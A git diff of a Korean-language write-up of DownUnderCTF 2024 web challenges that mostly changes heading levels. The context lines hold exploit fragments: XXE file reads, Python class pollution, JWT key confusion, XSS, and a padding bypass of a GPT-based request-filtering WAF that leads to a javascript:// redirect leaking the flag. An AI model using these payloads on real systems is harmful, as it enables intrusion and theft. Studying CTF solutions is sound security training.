@@ -67,7 +67,7 @@ if __name__ == '__main__':
 
 `render_template_string()` 함수에 사용자 입력이 직접적으로 들어가기 때문에 SSTI 취약점이 발생한다. 
        
-### Exploit Code    
+## Exploit Code    
       
 {% raw %}   
 ```python
@@ -75,7 +75,7 @@ if __name__ == '__main__':
 ```      
 {% endraw %}   
      
-### Flag
+## Flag
 DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
 
 <a id="zoo-feedback-form"></a>           
@@ -116,7 +116,7 @@ if __name__ == '__main__':
 유저로부터 XML 데이터를 입력 받고 `feedback` 요소 값이 포함되어있으면 이를 보여준다. 
 하지만, 태그에 대한 필터링이 존재하지 않아 XXE Injection이 가능하다. 
       
-### Exploit Code     
+## Exploit Code     
 ```javascript
 const xmlData = `<!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///app/flag.txt">
@@ -140,7 +140,7 @@ fetch('https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/', {
   });
 ```      
       
-### Flag     
+## Flag     
 DUCTF{emU_say$_he!!0_h0!@_ci@0}            
        
 
@@ -151,9 +151,7 @@ DUCTF{emU_say$_he!!0_h0!@_ci@0}
 289 solved / 100 pts      
 
 ```python
-############
-# utils.py #
-############
+# utils.py
 def merge(src, dst):
     for k, v in src.items():
         if hasattr(dst, '__getitem__'):
@@ -166,9 +164,7 @@ def merge(src, dst):
         else:
             setattr(dst, k, v)
 
-#############
-# routes.py #
-#############
+# routes.py 
 @app.route("/save_feedback", methods=["POST"])
 @login_required
 def save_feedback():
@@ -201,7 +197,7 @@ def get_flag():
 flag 값은 전역변수로 선언되어있어 `__class__.__init__.__globals__`로 전역 변수에 접근이 가능하다.     
 즉, merge()로 `__class__.__init__.__globals__.flag` 값을 "true"로 변경해주면 된다.               
                
-### Exploit Code    
+## Exploit Code    
 ```python
 import requests
 
@@ -230,7 +226,7 @@ r = requests.get(
 print(r.text) 
 ```      
      
-### Flag    
+## Flag    
 DUCTF{_cl455_p0lluti0n_ftw_}         
          
 
@@ -276,7 +272,7 @@ curl \
 ```               
 문서에 따르면, `/forms/chromium/convert/html` 경로에 index.html 파일을 올려 PDF 파일로 결과 값을 생성한다. 테스트 코드에 명시된 경로를 `/etc/flag.txt`로 변경하고 요청을 보내면 플래그를 획득할 수 있다.   
      
-### Exploit Code    
+## Exploit Code    
 
 index.html
 ```html
@@ -293,7 +289,7 @@ curl \
 -o my.pdf     
 ```      
      
-### Flag     
+## Flag     
 DUCTF{dEeZ_r3GeX_cHeCK5_h4h_g0t_eM}
        
               
@@ -382,7 +378,7 @@ https://github.com/nu11secur1ty/rsa_sign2n/blob/main/jwt_forgery.py
 
 토큰 두 개를 넘기면 x509.pem, pkcs1.pem 공개키를 만들어주는 툴   
                   
-### Exploit Code     
+## Exploit Code     
 ```javascript 
 const jwt = require("jsonwebtoken")
 var fs = require("fs")
@@ -396,7 +392,7 @@ fetch("https://i-am-confusion.2024.ductf.dev:30001/admin.html",
 ).then((res) => { return res.text() }).then((res) => { console.log(res) })    
 ```    
 
-### Flag 
+## Flag 
 DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}     
       
 
@@ -534,18 +530,14 @@ def update_template():
 `TEMPLATES_ESCAPE_ALL=False`로 설정하고 위 경로에 요청을 보내면 태그 삽입이 가능해진다.     
 
 ```python
-############
-# utils.py #
-############
+# utils.py 
 def generate_random_string(length=16):
     characters = string.ascii_letters + string.digits
     random_string = ''.join(random.choice(characters) for _ in range(length))
     return random_string    
 
-#############
-# routes.py #
-#############
 
+# routes.py 
 SECRET_NONCE = generate_random_string()
 
 ...
@@ -611,7 +603,7 @@ def report():
 단, 게시글 내용의 길이가 100을 넘어갈 수 없어 제목에 스크립트를 삽입하고 봇을 요청하면 플래그를 획득할 수 있다.    
 대회 당시에 제목에 스크립트 구문을 다 넣으면 길이가 안될 것 같아서 /**/ 주석을 사용해 문제를 해결했는데 제목에 스크립트 구문을 다 넣어도 문제가 없었다는 사실 ... 
     
-### Exploit Code    
+## Exploit Code    
 ```python
 import requests
 
@@ -664,7 +656,7 @@ r = requests.get(
 print(r.text) 
 ```    
       
-### Flag   
+## Flag   
 DUCTF{_1_d3cid3_wh4ts_esc4p3d_}
 
 
@@ -762,7 +754,7 @@ readfile($file);
 ```
 풀이를 참고하니 `/etc/apache2/magic`에 MIME 타입들이 정의되어있고, 1080번째 값이 M.K. 문자일 경우에 `audio/x-mod`로 인식한다는 사실을 알게되었다. 즉, `theme` 파라미터에 M.K. 문자를 넣고 `/tmp/sess_{PHPSESSID}` 파일에 접근하면 문제를 해결할 수 있다.    
        
-### Exploit Code   
+## Exploit Code   
 ```python
 import requests
 
@@ -785,7 +777,7 @@ for i in range(4):
         print(r.text) 
 ```         
         
-### Flag       
+## Flag       
 DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}     
 
       
@@ -884,11 +876,9 @@ export default router;
 ```
 `/auth` 엔드포인트에 접근 시, `waifuMiddleware`, `redirectIfAuthMiddleware` 미들웨어를 거친다.    
          
+       
+utils/chatGPT.ts          
 ```typescript
-// ####################
-// # utils/chatGPT.ts #
-// ####################
-
 import OpenAI from 'openai';
 
 const GPT_PROMPT = `# Instructions
@@ -930,10 +920,10 @@ const analyseRequest = async (request: string): Promise<boolean> => {
 export {
   analyseRequest
 }
-
-// ####################
-// # utils/request.ts #
-// ####################
+```   
+     
+utils/request.ts
+```typescript
 
 import { Request } from "express";
 
@@ -953,10 +943,10 @@ const getRawRequest = (req: Request): string => {
 export {
     getRawRequest
 }
-
-// #######################
-// # middleware/waifu.ts #
-// #######################
+```
+    
+middleware/waifu.ts 
+```typescript
 
 import { Request, Response, NextFunction } from "express";
 import { analyseRequest } from "../utils/chatGPT";
@@ -1031,7 +1021,7 @@ export { sendError, sendResponse, sendBrowserRedirectResponse }
 ```        
 다음으로, 리다이렉션 기능이 존재하는데 Hostname이 동일한지 체크하고 리다이렉션을 허용한다. 하지만, scheme에 대한 검증이 이루어지고 있지 않아 `javascript://`를 사용해 스크립트를 실행시킬 수 있는 취약점이 발생한다. `fetch('/flag/get')` 요청을 보내 플래그 값을 읽은 후, 웹훅으로 전달해주면 된다.     
          
-### Exploit Code     
+## Exploit Code     
 ```python
 import base64
 
@@ -1043,7 +1033,7 @@ url = "/auth/?bypass=" + "%61" * 400 + f"&redirectTo=javascript://127.0.0.1:3000
 print(url) 
 ```       
        
-### Flag 
+## Flag 
 DUCTF{t0kN_tOOooOOO0Kn_tooKN_t000000000Kn_x60_OwO_w0t_d15_n0_w4F?????questionmark???}      
        
 
@@ -1292,7 +1282,7 @@ asdf: asdf */
 2. Crash bun By Failing open syscall    
 `Bun.File()` 실행 시, `open syscall`을 호출하게 되는데 Escape Character가 포함된 잘못된 파일 경로를 전달하여 crash를 발생시키는 방법 (예를 들어, `../../proc/self/fd/3\x`)    
     
-### Exploit Code         
+## Exploit Code         
     
 ```python
 import requests, base64
@@ -1335,6 +1325,6 @@ r = requests.post(
 )
 ```    
 
-### Flag    
+## Flag    
 DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}     
                
